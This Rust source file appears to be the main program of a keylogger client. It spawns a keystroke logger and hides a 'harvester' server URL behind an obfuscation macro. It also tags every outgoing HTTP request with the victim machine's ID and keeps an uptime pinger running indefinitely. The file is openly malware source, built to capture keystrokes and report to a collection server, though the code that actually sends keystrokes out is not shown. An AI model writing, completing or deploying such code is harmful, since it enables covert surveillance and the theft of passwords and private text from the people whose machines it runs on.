use std::{future::pending, sync::Arc};

use env_logger::Env;
use log::info;
use muddy::muddy;
use once_cell::sync::Lazy;
use oxalate_keylogger::spawn_keylogger;
use reqwest::{
    Client,
    header::{HeaderMap, HeaderValue},
};

mod uptime_pinger;
pub use uptime_pinger::uptime_pinger;

static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("http://localhost:6767"));
static MACHIDE_ID: Lazy<String> =
    Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));

#[tokio::main]
async fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();

    let mut headers = HeaderMap::new();
    headers.insert("machine-id", HeaderValue::from_str(&MACHIDE_ID).unwrap());
    let reqwest_client = Client::builder().default_headers(headers).build().unwrap();

    let rx = spawn_keylogger();
    uptime_pinger(reqwest_client.to_owned());

    info!("successfully inited, running forever!");
    pending::<()>().await;
}
